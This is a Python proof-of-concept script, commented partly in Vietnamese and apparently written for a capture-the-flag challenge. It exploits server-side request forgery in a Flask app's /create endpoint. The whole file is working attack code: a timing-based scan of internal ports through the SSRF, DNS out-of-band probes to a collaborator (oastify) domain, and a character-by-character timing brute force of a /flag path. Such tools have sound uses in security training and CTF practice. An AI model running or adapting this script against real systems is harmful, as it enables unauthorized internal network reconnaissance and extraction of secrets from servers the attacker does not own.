#!/usr/bin/env python3
# ssrf_poc.py
# PoC: SSRF blind helpers: port scanning (timing), DNS exfil attempts, time-based char brute
# Usage: edit BASE and optionally COLLAB_DOMAIN then run.

import requests
import time
import string
import sys
import urllib.parse

# ========== CONFIG ==========
BASE = "http://127.0.0.1"   # <-- đổi thành target Flask app (ví dụ http://10.10.10.5:5000)
CREATE_PATH = "/create"
TIMEOUT = 15                     # request timeout
SLEEP_BETWEEN = 0.3              # giữa các request
COLLAB_DOMAIN = None             # <-- ví dụ: "79eouqixmecey5hirvwvockkdbj27tvi.oastify.com"
# ============================

def ssrf_request(target_url):
    """Gửi request tới /create?url=target_url và trả về elapsed time và text"""
    try:
        full = f"{BASE}{CREATE_PATH}"
        r = requests.get(full, params={"url": target_url}, timeout=TIMEOUT)
        return (r.elapsed.total_seconds(), r.text)
    except requests.exceptions.ReadTimeout:
        return (TIMEOUT, None)
    except Exception as e:
        print(f"[!] Request error: {e}")
        return (None, None)

def scan_ports(port_start=1, port_end=2000, host="127.0.0.1"):
    """Dò tìm port mở bằng SSRF timing heuristic.
       Trả về list các port có thời gian phản hồi khác biệt."""
    print(f"[+] Start SSRF port scan {host}:{port_start}-{port_end}")
    baseline_url = f"http://{host}:9/"   # port 9 thường closed
    t_base, _ = ssrf_request(baseline_url)
    if t_base is None:
        print("[!] Không thể lấy baseline time, abort.")
        return []

    print(f"[i] Baseline time (port 9): {t_base:.3f}s")
    found = []
    for p in range(port_start, port_end+1):
        url = f"http://{host}:{p}/"
        t, _ = ssrf_request(url)
        if t is None:
            continue
        # heuristic: nếu chậm hơn baseline hoặc cực kỳ nhanh -> có thể open/filtered
        if t > t_base + 0.6 or t < t_base * 0.6:
            print(f"[+] Port maybe interesting: {p} (time={t:.3f}s)")
            found.append((p, t))
        # small delay to avoid flooding
        time.sleep(SLEEP_BETWEEN)
    return found

def collab_exfil_try(prefix, collab_domain):
    """Tạo request để hy vọng service nội bộ sẽ gọi về collaborator domain.
       prefix sẽ được đặt làm subdomain: e.g. <prefix>.<collab_domain>"""
    if collab_domain is None:
        print("[!] No collab domain configured.")
        return
    sub = f"{prefix}.{collab_domain}"
    url = f"http://{sub}/"
    t, text = ssrf_request(url)
    print(f"[+] Sent collab probe: {url} (elapsed {t})")
    # Bạn cần check logs trên oastify/collab để thấy callback.
    return (url, t, text)

def timing_bruteforce_char(host, port, path="/flag", max_len=32, charset=None):
    """
    Best-effort blind timing-based brute:
    - Gửi SSRF tới http://host:port{path}?q=<probe>
    - Hy vọng service trả khác biệt thời gian khi phần probe đúng
    NOTE: Cần tùy chỉnh payload theo ứng dụng mục tiêu.
    """
    if charset is None:
        charset = string.ascii_letters + string.digits + "_-{}"
    known = ""
    print(f"[+] Start timing brute on http://{host}:{port}{path}")
    for pos in range(max_len):
        best_char = None
        best_time = -1
        for c in charset:
            probe = known + c
            # craft URL - bạn có thể thay đổi tham số để match target behavior
            url = f"http://{host}:{port}{path}?q={urllib.parse.quote(probe)}"
            elapsed, _ = ssrf_request(url)
            if elapsed is None:
                continue
            print(f"    try pos {pos} char '{c}' -> time {elapsed:.3f}s")
            # heuristic: larger time suggests a match (depends on target)
            if elapsed > best_time:
                best_time = elapsed
                best_char = c
            time.sleep(SLEEP_BETWEEN)
        # decide threshold: if best_time significantly > median of tries, accept
        if best_char is None:
            print("[!] No candidate found, stop.")
            break
        print(f"[+] Best char at pos {pos}: '{best_char}' (time {best_time:.3f}s)")
        known += best_char
        # optional stopping condition if flag format known
        if known.endswith("}"):
            print("[+] Likely end of flag: ", known)
            break
    print("[*] Result (best-effort):", known)
    return known

if __name__ == "__main__":
    print("== SSRF PoC helper ==")
    # 1) quick collab test if domain set
    if COLLAB_DOMAIN:
        print("[*] Sending test collab probes (subdomains abc / test / flagtest)...")
        for p in ("abc","test","flagtest"):
            collab_exfil_try(p, COLLAB_DOMAIN)
        print("[*] Check your collaborator logs for callbacks.\n")

    # 2) quick port scan (small range by default)
    print("[*] Running small port scan (1..200) for quick check...")
    ports = scan_ports(1, 200)
    if ports:
        print("[*] Interesting ports found:", ports)
    else:
        print("[*] No interesting ports found in 1..200 (try larger range).\n")

    # 3) If you found container port earlier, try timing brute (example)
    # Edit host/port/path according to results:
    # example usage:
    # timing_bruteforce_char("127.0.0.1", 32768, "/?") 
    #
    print("[*] Done. Edit script variables and re-run to continue deeper probes.")
